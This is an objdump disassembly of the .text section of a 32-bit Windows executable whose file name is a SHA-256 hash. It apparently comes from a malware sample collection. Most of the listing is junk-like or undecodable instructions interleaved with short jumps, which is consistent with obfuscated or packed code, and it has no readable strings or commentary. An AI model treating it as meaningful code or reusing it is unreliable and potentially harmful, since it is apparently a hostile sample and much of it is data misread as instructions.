
525b383f37338e5625db119d766f8d7d7d94d5e2213679c81954ff35031b1a03.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	push   ebp
  402001:	mov    ebp,esp
  402003:	jmp    0x4020db
  402008:	adc    DWORD PTR [edx],ecx
  40200a:	mov    WORD PTR [ebp-0x71e66861],ss
  402010:	jne    0x40201d
  402012:	inc    bl
  402014:	jg     0x401fce
  402016:	sti    
  402017:	in     al,0x0
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [ebx+0x59000000],bh
  402021:	push   edx
  402022:	pop    ebx
  402023:	inc    ebp
  402024:	pop    ebp
  402025:	dec    ecx
  402026:	pop    edi
  402027:	push   ebx
  402028:	or     DWORD PTR [esi],edi
  40202a:	or     eax,0x10fc7f0c
  40202f:	adc    BYTE PTR [ecx],dl
  402031:	cmp    BYTE PTR [ecx+0x2e1685a2],ch
  402037:	syscall 
  402039:	pop    ds
  40203a:	(bad)  
  40203b:	push   es
  40203c:	adc    DWORD PTR ds:0x463021b3,ebx
  402042:	repnz sub bl,0xfc
  402046:	sbb    esi,DWORD PTR [ecx]
  402048:	add    edi,DWORD PTR [ebx]
  40204a:	test   ah,0x3
  40204d:	(bad)  
  40204e:	enter  0x523f,0x83
  402052:	or     al,0xa2
  402054:	adc    BYTE PTR [edi],0x3
  402057:	fs xchg ecx,eax
  402059:	cmp    eax,0xeb91c0b1
  40205e:	push   edi
  40205f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402060:	out    dx,eax
  402061:	dec    ebp
  402062:	jae    0x402081
  402064:	iret   
  402065:	lock stos BYTE PTR es:[edi],al
  402067:	jnp    0x40207a
  402069:	mov    eax,ds:0x80749a6a
  40206e:	dec    esp
  40206f:	pop    esi
  402070:	cs jb  0x4020bf
  402073:	femms  
  402075:	mov    ebp,0x692557d3
  40207a:	int3   
  40207b:	or     DWORD PTR [ebp+0x38fa4f2d],0xffffffae
  402082:	pop    ds
  402083:	jge    0x4020e5
  402085:	sub    ah,0x27
  402088:	adc    esp,esi
  40208a:	add    DWORD PTR [ecx-0x65f5a101],esp
  402090:	jmp    0x8403ed4c
  402095:	sbb    al,BYTE PTR fs:[ecx+eax*2]
  402099:	push   edx
  40209a:	pop    edx
  40209b:	lahf   
  40209c:	inc    esp
  40209d:	add    dl,dl
  40209f:	and    al,0x7d
  4020a1:	std    
  4020a2:	adc    BYTE PTR [edx],cl
  4020a4:	mov    bh,0x71
  4020a6:	outs   dx,DWORD PTR ds:[esi]
  4020a7:	inc    ebp
  4020a8:	(bad)
  4020ac:	or     DWORD PTR [esi-0x6560e6b3],0xffffffec
  4020b3:	imul   esp,DWORD PTR [edi+ebp*8+0x40c20807],0x7202fbb3
  4020be:	mov    dl,0x99
  4020c0:	sbb    ebp,ecx
  4020c2:	or     eax,0x1c671335
  4020c7:	sub    DWORD PTR [edx],ecx
  4020c9:	and    bx,WORD PTR [edx+edi*8+0x74]
  4020ce:	ds in  eax,dx
  4020d0:	lock fbstp TBYTE PTR [eax]
  4020d3:	lea    edi,[edx]
  4020d5:	jb     0x40213f
  4020d7:	sbb    eax,0x83ef5c22
  4020dc:	in     al,dx
  4020dd:	pusha  
  4020de:	mov    eax,DWORD PTR [ebp-0x40]
  4020e1:	adc    DWORD PTR ds:0x42f5a8,ecx
  4020e7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4020ea:	cmp    DWORD PTR ds:0x42f610,0x0
  4020f1:	jge    0x4021e2
  4020f7:	jmp    0x4021e2
  4020fc:	push   DWORD PTR [ebp-0x18]
  4020ff:	push   0x3de1
  402104:	call   DWORD PTR ds:0x4387a0
  40210a:	jmp    0x4021e2
  40210f:	xchg   DWORD PTR [eax],esp
  402111:	xor    BYTE PTR [edx+0x3587b2b7],dh
  402117:	and    DWORD PTR [edx+0x21],ebx
  40211a:	jo     0x402121
  40211c:	retf   0x6da7
  40211f:	mov    ebx,0xbb000000
  402124:	add    BYTE PTR [eax],al
  402126:	add    BYTE PTR [eax-0x16],cl
  402129:	push   0x7c
  40212b:	dec    ebp
  40212c:	sub    DWORD PTR [ecx],edi
  40212e:	jle    0x402181
  402130:	pushf  
  402131:	jmp    0x40219a
  402133:	or     esp,DWORD PTR [ebx-0x44]
  402136:	sub    eax,0x4f22ae5a
  40213b:	xchg   DWORD PTR [ebp+0x7564e895],esi
  402141:	je     0x4020d3
  402143:	jo     0x4021a9
  402145:	shl    BYTE PTR [ecx+0x74d85ee0],1
  40214b:	int3   
  40214c:	lds    ebx,FWORD PTR [ebx+0x3c001d8]
  402152:	xchg   esp,eax
  402153:	xor    DWORD PTR [esi-0x2de6a04d],ecx
  402159:	dec    edi
  40215a:	jno    0x402195
  40215c:	dec    eax
  40215d:	outs   dx,DWORD PTR ds:[esi]
  40215e:	mov    ah,0xc5
  402160:	dec    ebx
  402161:	leave  
  402162:	or     BYTE PTR [edx],dl
  402164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402165:	ror    BYTE PTR [ecx],0x45
  402168:	hlt    
  402169:	add    al,0x84
  40216b:	adc    al,0x6
  40216d:	add    eax,0x866b7f4e
  402172:	sbb    eax,0xafc9e96d
  402177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402178:	inc    esp
  402179:	sar    DWORD PTR [eax],cl
  40217b:	dec    esp
  40217c:	or     dh,BYTE PTR [ebx]
  40217e:	(bad)  
  40217f:	pop    edx
  402180:	shl    DWORD PTR [ebx-0x68305fca],cl
  402186:	or     dh,BYTE PTR [ebx+0x69]
  402189:	jne    0x4021e7
  40218b:	xchg   esp,eax
  40218c:	outs   dx,BYTE PTR ds:[esi]
  40218d:	push   ebx
  40218e:	or     ebp,DWORD PTR [ecx+0x53]
  402191:	xor    esp,ebp
  402193:	lds    edi,FWORD PTR [ebx-0x6e]
  402196:	or     edx,DWORD PTR [eax]
  402198:	and    eax,0x2da1b3f0
  40219d:	es (bad) 
  40219f:	xchg   ecx,eax
  4021a0:	int    0xb2
  4021a2:	inc    esi
  4021a3:	jns    0x402156
  4021a5:	bound  edx,QWORD PTR [ecx-0x3e]
  4021a8:	mov    eax,ds:0x5cb536a1
  4021ad:	xchg   ecx,eax
  4021ae:	xor    DWORD PTR [edi+edx*8-0x579da245],edi
  4021b5:	jb     0x4021f7
  4021b7:	call   0x118aa4bf
  4021bc:	cli    
  4021bd:	in     al,dx
  4021be:	stc    
  4021bf:	or     eax,0xee3e61dd
  4021c4:	sbb    ch,ah
  4021c6:	mov    dl,0xfb
  4021c8:	lock mov eax,ds:0x3fbfa901
  4021ce:	jg     0x4021af
  4021d0:	gs loopne 0x402252
  4021d3:	push   esp
  4021d4:	aad    0x8e
  4021d6:	xchg   ebp,eax
  4021d7:	in     eax,dx
  4021d8:	inc    esp
  4021d9:	push   cs
  4021da:	addr16 popf 
  4021dc:	pushf  
  4021dd:	jp     0x40219a
  4021df:	push   ss
  4021e0:	xadd   BYTE PTR [ebx-0x3dd43fab],cl
  4021e7:	jmp    0x4022bf
  4021ec:	push   0xffffffc8
  4021ee:	or     ecx,DWORD PTR [ebx+ebp*4-0x31]
  4021f2:	outs   dx,DWORD PTR ds:[esi]
  4021f3:	out    dx,al
  4021f4:	dec    edx
  4021f5:	imul   eax,DWORD PTR [ebx+0x18e9730d],0x176cd
  4021ff:	add    BYTE PTR [ebx-0x3a000000],bh
  402205:	stc    
  402206:	dec    ecx
  402207:	stc    
  402208:	fidivr DWORD PTR [ecx-0x41]
  40220b:	lahf   
  40220c:	arpl   si,bp
  40220e:	mov    eax,gs:0xe3a233b7
  402214:	jge    0x4021b4
  402216:	js     0x402220
  402218:	mov    cl,0xfc
  40221a:	retf   
  40221b:	popf   
  40221c:	sub    bl,BYTE PTR [ecx]
  40221e:	xor    BYTE PTR [ebx-0x41efb7d7],dl
  402224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402225:	data16 mov dh,0xce
  402228:	aad    0xea
  40222a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40222b:	push   ecx
  40222c:	jg     0x40224f
  40222e:	loope  0x40224f
  402230:	mov    BYTE PTR ds:0x85475d5,al
  402236:	daa    
  402237:	movhps QWORD PTR [ecx-0x20],xmm6
  40223b:	icebp  
  40223c:	pusha  
  40223d:	xchg   DWORD PTR [edx+0x28],esi
  402240:	mov    cl,0xf0
  402242:	in     eax,0xe7
  402244:	push   cs
  402245:	leave  
  402246:	dec    edi
  402247:	imul   ecx,edx,0x377b9ccc
  40224d:	ins    DWORD PTR es:[edi],dx
  40224e:	pop    ecx
  40224f:	xlat   BYTE PTR ds:[ebx]
  402250:	clc    
  402251:	dec    ebx
  402252:	popa   
  402253:	ss fs add eax,0xbc1ede7
  40225a:	(bad)  
  40225b:	idiv   BYTE PTR [edx+eiz*2+0x49f00f97]
  402262:	(bad)  [eax+0x42]
  402265:	adc    ch,BYTE PTR [ecx+0x72982ae]
  40226b:	push   eax
  40226c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40226d:	mov    cl,0x3c
  40226f:	fmulp  st(2),st
  402271:	sbb    ecx,edx
  402273:	(bad)  
  402274:	std    
  402275:	jno    0x402273
  402277:	mov    ebp,0x1e59a1f7
  40227c:	shr    DWORD PTR ds:0x9a165047,cl
  402282:	in     eax,dx
  402283:	cdq    
  402284:	adc    eax,ebp
  402286:	inc    ebx
  402287:	sti    
  402288:	mov    dh,BYTE PTR [edi]
  40228a:	js     0x402270
  40228c:	push   edi
  40228d:	cmp    dl,BYTE PTR ds:0x8cf2c44b
  402293:	jg     0x4022ef
  402295:	cmp    al,bh
  402297:	call   0x1a41:0xa2470781
  40229e:	inc    esp
  40229f:	dec    ecx
  4022a0:	push   ds
  4022a1:	and    DWORD PTR [esi+0x41],edx
  4022a4:	pop    ebx
  4022a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022a6:	xchg   ebx,eax
  4022a7:	mov    ebp,0x1e15c018
  4022ac:	test   DWORD PTR [edi],ebp
  4022ae:	aaa    
  4022af:	icebp  
  4022b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022b1:	std    
  4022b2:	rol    DWORD PTR [eax+0x176e0a9d],1
  4022b8:	stc    
  4022b9:	es (bad) 
  4022bb:	outs   dx,BYTE PTR ds:[esi]
  4022bc:	jnp    0x402312
  4022be:	xchg   BYTE PTR [ebx+0x56],dl
  4022c1:	jmp    0x402399
  4022c6:	inc    ebx
  4022c7:	aad    0x6d
  4022c9:	pop    ds
  4022ca:	(bad)  
  4022cb:	mov    edi,0x8ee8dd73
  4022d0:	push   esp
  4022d1:	fimul  WORD PTR [edx]
  4022d3:	adc    edx,DWORD PTR [ebx+0x231c7]
  4022d9:	add    BYTE PTR [ebx-0x3e000000],bh
  4022df:	bound  ebx,QWORD PTR [ebx-0x61a22b2f]
  4022e5:	jl     0x402284
  4022e7:	push   eax
  4022e8:	cmp    esp,DWORD PTR [ebp-0x2a]
  4022eb:	sub    esi,DWORD PTR [ebp*1+0x4f46002c]
  4022f2:	out    dx,al
  4022f3:	cmp    DWORD PTR [eax+0x32f487a2],ecx
  4022f9:	jl     0x40227e
  4022fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022fc:	pop    edi
  4022fd:	(bad)  
  4022fe:	fdivr  QWORD PTR [edx+ebx*8]
  402301:	inc    ebx
  402302:	mov    bh,0xe8
  402304:	mov    edx,0x89344f83
  402309:	test   al,0xff
  40230b:	aaa    
  40230c:	mov    edi,DWORD PTR [edi-0x15]
  40230f:	icebp  
  402310:	loope  0x40231f
  402312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402313:	int    0x4e
  402315:	push   esi
  402316:	in     eax,0xf4
  402318:	mov    ecx,0x4fe1f68a
  40231d:	fsub   st(4),st
  40231f:	bound  edx,QWORD PTR [esi-0x6814e187]
  402325:	hlt    
  402326:	mov    esp,0x28be8fae
  40232b:	sub    edi,ecx
  40232d:	pop    edx
  40232e:	pop    edi
  40232f:	stos   DWORD PTR es:[edi],eax
  402330:	cmp    eax,0x39060fad
  402335:	mov    eax,0x65bf1c25
  40233a:	(bad)  [esi]
  40233c:	adc    dl,al
  40233e:	lock and al,0x39
  402341:	cmc    
  402342:	or     al,0x1d
  402344:	ja     0x40238b
  402346:	test   al,0xca
  402348:	push   ss
  402349:	sub    BYTE PTR [ecx+0x2c41f0d1],dh
  40234f:	out    0x5b,eax
  402351:	xchg   edi,eax
  402352:	sub    dl,BYTE PTR [ebx-0x17]
  402355:	cmp    BYTE PTR [edi-0x3b],ah
  402358:	scas   al,BYTE PTR es:[edi]
  402359:	xchg   DWORD PTR [eax],esp
  40235b:	scas   al,BYTE PTR es:[edi]
  40235c:	fldcw  WORD PTR [edx+0x19]
  40235f:	mov    ss,WORD PTR [ecx]
  402361:	push   cs
  402362:	add    al,0xac
  402364:	push   cs
  402365:	mov    al,0x89
  402367:	bound  eax,QWORD PTR [ebx]
  402369:	stos   BYTE PTR es:[edi],al
  40236a:	mov    WORD PTR [edi+ecx*8-0x7c9c30a3],ss
  402371:	jns    0x4023a1
  402373:	rol    BYTE PTR [eax],1
  402375:	mov    ebx,0xbd0b34c6
  40237a:	cdq    
  40237b:	add    ch,BYTE PTR [ecx-0x5]
  40237e:	bound  eax,QWORD PTR ds:0xa40a0097
  402384:	adc    esi,DWORD PTR [ebp+0xeaea96d]
  40238a:	xlat   BYTE PTR ds:[ebx]
  40238b:	jns    0x40236d
  40238d:	sti    
  40238e:	push   eax
  40238f:	jmp    0xaa7:0xed27df7b
  402396:	(bad)  
  402398:	inc    ebx
  402399:	mov    esi,DWORD PTR [ebp-0x3c]
  40239c:	mov    DWORD PTR [ebp-0x40],eax
  40239f:	sbb    ecx,esi
  4023a1:	or     DWORD PTR ds:0x42f648,0x42f61c
  4023ab:	mov    DWORD PTR [ebp-0x3c],ecx
  4023ae:	sub    ebx,edx
  4023b0:	or     DWORD PTR [ebp-0x40],0xebeb2a60
  4023b7:	or     edx,0x679e
  4023bd:	mov    eax,0xffffdedc
  4023c2:	cmp    DWORD PTR ds:0x42f570,0x0
  4023c9:	jbe    0x4024b8
  4023cf:	jmp    0x4024b8
  4023d4:	push   DWORD PTR [ebp-0x18]
  4023d7:	push   DWORD PTR [ebp-0x14]
  4023da:	call   DWORD PTR ds:0x4387a4
  4023e0:	jmp    0x4024b8
  4023e5:	into   
  4023e6:	mov    ds:0xefefefaf,al
  4023eb:	into   
  4023ec:	mov    ds:0x3f73af7d,eax
  4023f1:	mov    ebp,0xec9fd216
  4023f6:	add    al,BYTE PTR [eax]
  4023f8:	add    BYTE PTR [ebx-0x28000000],bh
  4023fe:	ins    BYTE PTR es:[edi],dx
  4023ff:	mov    ss,WORD PTR [esi]
  402401:	arpl   WORD PTR [ecx+esi*1-0x47dfbcdd],cx
  402408:	inc    eax
  402409:	dec    edx
  40240a:	dec    ecx
  40240b:	inc    esp
  40240c:	sbb    esi,esi
  40240e:	xor    BYTE PTR ds:0xa4145a5d,ah
  402414:	adc    ebx,DWORD PTR [edi-0x27cfdb44]
  40241a:	(bad)  
  40241b:	ja     0x4023e8
  40241d:	dec    esp
  40241e:	sbb    eax,0xa6f2f200
  402423:	cmp    ah,BYTE PTR [edi+0x7c59bf98]
  402429:	mov    ecx,DWORD PTR [eax]
  40242b:	aad    0x68
  40242d:	aaa    
  40242e:	test   eax,0x9ee06952
  402433:	jmp    DWORD PTR [edx]
  402435:	fadd   DWORD PTR [edx-0x4c]
  402438:	dec    esp
  402439:	ret    
  40243a:	sbb    al,0xcb
  40243c:	retf   
  40243d:	cmp    BYTE PTR [edi-0x4d],ch
  402440:	add    ebp,DWORD PTR [edi]
  402442:	test   BYTE PTR ds:0x46e671e3,0x71
  402449:	sub    al,0x6c
  40244b:	cld    
  40244c:	fisttp QWORD PTR [ecx+0x76c09ccd]
  402452:	jmp    0xfb5f5c47
  402457:	inc    ecx
  402458:	fisubr DWORD PTR ds:0x3fffdace
  40245e:	cs inc esp
  402460:	cmp    al,BYTE PTR [eax]
  402462:	add    BYTE PTR [ecx+0x65],cl
  402465:	(bad)  
  402467:	pop    es
  402468:	xor    eax,0xdb566715
  40246d:	lds    edi,FWORD PTR [edx+0x61a5439b]
  402473:	(bad)  
  402474:	call   0xc49ced3f
  402479:	out    dx,al
  40247a:	enter  0xd21f,0x4c
  40247e:	push   es
  40247f:	out    dx,al
  402480:	aaa    
  402481:	jno    0x402426
  402483:	adc    BYTE PTR [edi-0x4c],dh
  402486:	pop    ss
  402487:	adc    ebp,DWORD PTR [esp+edx*2-0x3906e13a]
  40248e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40248f:	xor    eax,0x55db6520
  402494:	dec    ebx
  402495:	ds mov ch,0x7c
  402498:	cmp    eax,0x9bf87ecd
  40249d:	inc    edx
  40249e:	mov    BYTE PTR [ecx],bh
  4024a0:	jnp    0x402480
  4024a2:	jb     0x402449
  4024a4:	add    BYTE PTR [esi],bh
  4024a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024a7:	pop    esp
  4024a8:	mov    cl,0xba
  4024aa:	pop    ecx
  4024ab:	xor    al,bh
  4024ad:	mov    dl,0x7a
  4024af:	xchg   edi,eax
  4024b0:	dec    esp
  4024b1:	dec    esp
  4024b2:	mov    esp,0xcc366557
  4024b7:	pusha  
  4024b8:	or     DWORD PTR [ebp-0x3c],eax
  4024bb:	mov    ecx,DWORD PTR [ebp-0x48]
  4024be:	mov    edx,DWORD PTR [ebp-0x44]
  4024c1:	mov    esi,DWORD PTR [ebp-0x48]
  4024c4:	mov    ebx,DWORD PTR [ebp-0x44]
  4024c7:	sub    ecx,esi
  4024c9:	mov    DWORD PTR [ebp-0x48],ecx
  4024cc:	movzx  esi,BYTE PTR ds:0x42f52c
  4024d3:	sbb    edx,ebx
  4024d5:	jmp    0x4025ad
  4024da:	jecxz  0x402511
  4024dc:	adc    al,0xaf
  4024de:	(bad)  
  4024df:	scas   eax,DWORD PTR es:[edi]
  4024e0:	sti    
  4024e1:	jge    0x402490
  4024e3:	scas   al,BYTE PTR es:[edi]
  4024e4:	cdq    
  4024e5:	int    0xf6
  4024e7:	xchg   edx,eax
  4024e8:	or     BYTE PTR [edi],bh
  4024ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024eb:	add    eax,DWORD PTR [eax]
  4024ed:	add    BYTE PTR [ebx-0x2b000000],bh
  4024f3:	lahf   
  4024f4:	outs   dx,BYTE PTR ds:[esi]
  4024f5:	mov    ebx,0x7fcc9b50
  4024fa:	pop    ebx
  4024fb:	rol    DWORD PTR ds:0xdb840464,0x86
  402502:	outs   dx,BYTE PTR ds:[esi]
  402503:	mov    dh,ch
  402505:	test   eax,0xe17c08e2
  40250a:	popa   
  40250b:	(bad)  [ecx]
  40250d:	fs dec ecx
  40250f:	loop   0x4024dd
  402511:	pop    ss
  402512:	push   eax
  402513:	push   0x71
  402515:	hlt    
  402516:	mov    dh,BYTE PTR [eax+0x13]
  402519:	nop
  40251a:	mov    ebx,0xd8ff2515
  40251f:	and    al,0xe9
  402521:	rcl    DWORD PTR [ecx],cl
  402523:	push   ebx
  402524:	adc    ecx,DWORD PTR [eax+ebx*4]
  402527:	lods   al,BYTE PTR ds:[esi]
  402528:	repnz test eax,0x4303b62f
  40252e:	mov    ds:0x2ff67b7a,al
  402533:	popf   
  402534:	xchg   esi,eax
  402535:	sbb    bh,dl
  402537:	fwait
  402538:	aam    0xa9
  40253a:	mov    BYTE PTR [eax+edi*8+0x6b],0xbb
  40253f:	pop    ebp
  402540:	lods   al,BYTE PTR ds:[esi]
  402541:	or     al,0x40
  402543:	jle    0x40259f
  402545:	pop    es
  402546:	shl    DWORD PTR [eax+0x7ffb2586],0x39
  40254d:	jne    0x402575
  40254f:	out    0x61,eax
  402551:	pop    edx
  402552:	and    eax,0xc011f32a
  402557:	xchg   edi,eax
  402558:	gs int3 
  40255a:	lods   al,BYTE PTR ds:[esi]
  40255b:	ja     0x402560
  40255d:	and    DWORD PTR [edi+0x34],0xffffff85
  402561:	inc    ebp
  402562:	je     0x402595
  402564:	push   ebx
  402565:	and    BYTE PTR [edi],cl
  402567:	inc    esi
  402568:	cmp    bh,bl
  40256a:	(bad)  
  40256b:	and    bl,bh
  40256d:	imul   esi,DWORD PTR [esi+0x51c04e2f],0xd2541b72
  402577:	in     eax,dx
  402578:	mov    ds:0xff2a7c0c,eax
  40257d:	rol    DWORD PTR [ebx-0x17],0x90
  402581:	out    dx,al
  402582:	or     edi,DWORD PTR [ecx-0x4c88d752]
  402588:	xlat   BYTE PTR ds:[ebx]
  402589:	sbb    al,0x78
  40258b:	mov    esi,es
  40258d:	out    0x76,eax
  40258f:	or     BYTE PTR [eax],bl
  402591:	jmp    0xe56c7c8c
  402596:	sbb    DWORD PTR [ebp-0x611d39c1],eax
  40259c:	repnz adc eax,0x6447decb
  4025a2:	dec    BYTE PTR [eax-0x4dd9bb6e]
  4025a8:	frstor [ecx-0x76883c21]
  4025ae:	push   ebp
  4025af:	mov    esp,0xd3e9
  4025b4:	add    BYTE PTR [eax-0x499e49d4],ch
  4025ba:	sti    
  4025bb:	(bad)  
  4025bc:	in     eax,dx
  4025bd:	outs   dx,DWORD PTR ds:[esi]
  4025be:	lea    ebx,[edi-0x61]
  4025c1:	pop    edx
  4025c2:	mov    eax,0x462de1c
  4025c7:	add    BYTE PTR [eax],al
  4025c9:	mov    ebx,0xe4000000
  4025ce:	ret    0x73f0
  4025d1:	enter  0x2058,0x3e
  4025d5:	or     DWORD PTR [eax],ecx
  4025d7:	xchg   esp,eax
  4025d8:	inc    eax
  4025d9:	mov    ds:0x873a26ad,al
  4025de:	lods   al,BYTE PTR ds:[esi]
  4025df:	jnp    0x4025fd
  4025e1:	push   esp
  4025e2:	loopne 0x402625
  4025e4:	(bad)  
  4025e7:	xchg   BYTE PTR [ebx+0x4e],dh
  4025ea:	pop    esi
  4025eb:	hlt    
  4025ec:	cdq    
  4025ed:	push   0xeb9dcf5a
  4025f2:	mov    ebp,0x15e1d605
  4025f7:	xor    DWORD PTR [ebx],eax
  4025f9:	and    eax,0x692a4419
  4025fe:	mov    edi,0x42c78d50
  402603:	dec    eax
  402604:	jmp    0x402664
  402606:	pushf  
  402607:	repz cmp dl,dh
  40260a:	std    
  40260b:	neg    BYTE PTR [esi+0x33]
  40260e:	mov    al,ds:0xd437e58d
  402613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402614:	(bad)  
  402615:	mov    ds:0xc6e102e2,eax
  40261a:	repz pop es
  40261c:	xlat   BYTE PTR ds:[ebx]
  40261d:	cs je  0x4025bd
  402620:	nop
  402621:	inc    esp
  402622:	mov    ds:0x38066b63,al
  402627:	shl    DWORD PTR [ebx-0x24],0x78
  40262b:	mov    ebp,DWORD PTR [esi+0xc8357f1]
  402631:	add    eax,0x75516fc7
  402636:	cmp    BYTE PTR [eax-0x3e90c274],al
  40263c:	(bad)  
  40263d:	test   eax,0xa48aa0e7
  402642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402643:	aaa    
  402644:	mov    eax,cs:0xc39a2ca9
  40264a:	cwde   
  40264b:	pop    edi
  40264c:	add    cl,BYTE PTR [ebp+0x6ea39469]
  402652:	inc    esi
  402653:	mov    ecx,0xcb6267b7
  402658:	fldcw  WORD PTR [edx-0x397d98cd]
  40265e:	cmp    al,0xd0
  402660:	not    esi
  402662:	xor    al,0xd0
  402664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402665:	les    edi,FWORD PTR ds:0xb29effef
  40266b:	inc    esp
  40266c:	push   ds
  40266d:	xor    ecx,DWORD PTR [ecx+0x4b152971]
  402673:	aaa    
  402674:	or     BYTE PTR [esi-0x46],dh
  402677:	repz (bad) [edi-0x59]
  40267b:	setb   bl
  40267e:	stos   DWORD PTR es:[edi],eax
  40267f:	in     al,dx
  402680:	clc    
  402681:	add    esi,DWORD PTR [eax+0x76]
  402684:	pop    ecx
  402685:	(bad)  
  402686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402687:	push   ebx
  402688:	or     DWORD PTR [ebp-0x48],0xebeb309e
  40268f:	mov    esi,DWORD PTR ds:0x42f664
  402695:	sbb    esi,DWORD PTR ds:0x42f644
  40269b:	mov    DWORD PTR ds:0x42f664,esi
  4026a1:	or     DWORD PTR [ebp-0x44],eax
  4026a4:	mov    eax,ds:0x42f02c
  4026a9:	mov    eax,DWORD PTR [eax]
  4026ab:	dec    ebx
  4026ac:	jmp    0x402784
  4026b1:	mov    ecx,0x7d5e31d5
  4026b6:	(bad)  
  4026b7:	push   edi
  4026b9:	dec    eax
  4026ba:	(bad)
  4026be:	pop    edx
  4026bf:	jae    0x402731
  4026c1:	sbb    eax,0xbb000005
  4026c6:	add    BYTE PTR [eax],al
  4026c8:	add    BYTE PTR [esi],dh
  4026ca:	pop    ebx
  4026cb:	mov    bh,0xb6
  4026cd:	mov    BYTE PTR [ebp+edx*4+0x60],0x2b
  4026d2:	sar    DWORD PTR [esi],1
  4026d4:	sbb    eax,0x387045bb
  4026d9:	imul   ecx,esi,0xabcd3e4f
  4026df:	cmc    
  4026e0:	cli    
  4026e1:	cmp    dl,dl
  4026e3:	int    0xba
  4026e5:	push   ds
  4026e6:	out    0xe6,eax
  4026e8:	(bad)  
  4026e9:	aam    0x12
  4026eb:	fstp   DWORD PTR [ebx]
  4026ed:	lahf   
  4026ee:	dec    esi
  4026ef:	ins    BYTE PTR es:[edi],dx
  4026f0:	fst    st(6)
  4026f2:	shl    al,1
  4026f4:	pop    edi
  4026f5:	mov    ds:0x5a53d9fc,al
  4026fa:	sti    
  4026fb:	es leave 
  4026fd:	sbb    al,0x7f
  4026ff:	test   BYTE PTR [ebx+0x7f0e98c9],ch
  402705:	test   DWORD PTR ds:0x46d178e3,0x399d7f55
  40270f:	gs push edi
  402711:	push   esi
  402712:	cmp    DWORD PTR [eax+edi*2],ebp
  402715:	xor    al,BYTE PTR [edx-0x75dc61d0]
  40271b:	in     eax,0xd0
  40271d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40271e:	shr    DWORD PTR [esi+esi*4],cl
  402721:	lods   al,BYTE PTR ds:[esi]
  402722:	cmp    ah,cl
  402724:	sbb    al,BYTE PTR [ebx+0x19]
  402727:	inc    edi
  402728:	(bad)  
  402729:	cli    
  40272a:	and    al,0x33
  40272c:	inc    esp
  40272d:	not    BYTE PTR [esi+0x28]
  402730:	adc    edx,DWORD PTR [esi+0x4a]
  402733:	cmc    
  402734:	pop    eax
  402735:	xor    ecx,DWORD PTR [esp+ecx*4-0x2dfcb5ba]
  40273c:	lods   al,BYTE PTR ds:[esi]
  40273d:	sbb    al,0xb8
  40273f:	mov    esp,0x96a0fafc
  402744:	xor    ah,BYTE PTR ds:0x8efb14c9
  40274a:	(bad)  
  40274b:	outs   dx,BYTE PTR ds:[esi]
  40274c:	shr    DWORD PTR [ebx+0x51],0x79
  402750:	in     al,0x52
  402752:	pop    es
  402753:	(bad)  
  402755:	mov    ebp,0x236ed318
  40275a:	xor    cl,BYTE PTR [ecx-0x4b]
  40275d:	mov    ecx,0x7fb742fe
  402762:	mov    ds,ecx
  402764:	call   0x406da4c4
  402769:	dec    edx
  40276a:	jo     0x4027a0
  40276c:	rol    BYTE PTR [esi-0x39744bf0],0xa4
  402773:	xchg   DWORD PTR [esi-0x7a],ebx
  402776:	stc    
  402777:	pusha  
  402778:	jb     0x402789
  40277a:	push   cs
  40277b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40277c:	ins    DWORD PTR es:[edi],dx
  40277d:	add    eax,0x969643af
  402782:	jmp    DWORD PTR ds:0x3104d8b
  402788:	add    ecx,ebp
  40278a:	rol    DWORD PTR [eax],cl
  40278c:	add    BYTE PTR [eax],al
  40278e:	pop    ecx
  40278f:	outs   dx,DWORD PTR ds:[esi]
  402790:	sub    eax,0xfbd63f96
  402795:	out    dx,eax
  402796:	(bad)  
  402798:	xchg   ecx,eax
  402799:	dec    esi
  40279a:	jbe    0x402755
  40279c:	iret   
  40279d:	int    0xd8
  40279f:	add    eax,0xbb0000
  4027a4:	add    BYTE PTR [eax],al
  4027a6:	jb     0x40277c
  4027a8:	mov    bl,0xf9
  4027aa:	jne    0x402756
  4027ac:	fldenv [ebx+0x74bf82d0]
  4027b2:	in     al,0xcd
  4027b4:	adc    al,0x64
  4027b6:	test   BYTE PTR [eax-0x3c],dh
  4027b9:	mov    al,ds:0xfdc85d99
  4027be:	pop    ebx
  4027bf:	pop    ecx
  4027c0:	fild   DWORD PTR [ebp-0x2f]
  4027c3:	mov    al,0xe3
  4027c5:	lea    edx,[ebx]
  4027c7:	enter  0x8df2,0xa3
  4027cb:	jne    0x402763
  4027cd:	(bad)  [edi+0x1ab10554]
  4027d3:	(bad)  
  4027d5:	mov    ds:0x5a1bbe88,eax
  4027da:	out    dx,al
  4027db:	vorps  xmm0,xmm4,XMMWORD PTR fs:[eax]
  4027e0:	cmp    eax,0x4b7c3a95
  4027e5:	mov    edi,DWORD PTR [ebx-0x11]
  4027e8:	aam    0x38
  4027ea:	mov    ch,0x21
  4027ec:	sub    bl,BYTE PTR [edx]
  4027ee:	or     al,0xe7
  4027f0:	push   ebx
  4027f1:	div    BYTE PTR [esp+edi*2]
  4027f4:	stos   DWORD PTR es:[edi],eax
  4027f5:	imul   BYTE PTR [esi]
  4027f7:	xor    DWORD PTR [edx-0x51b7ccda],esi
  4027fd:	push   ebx
  4027fe:	js     0x402793
  402800:	lahf   
  402801:	or     bl,bh
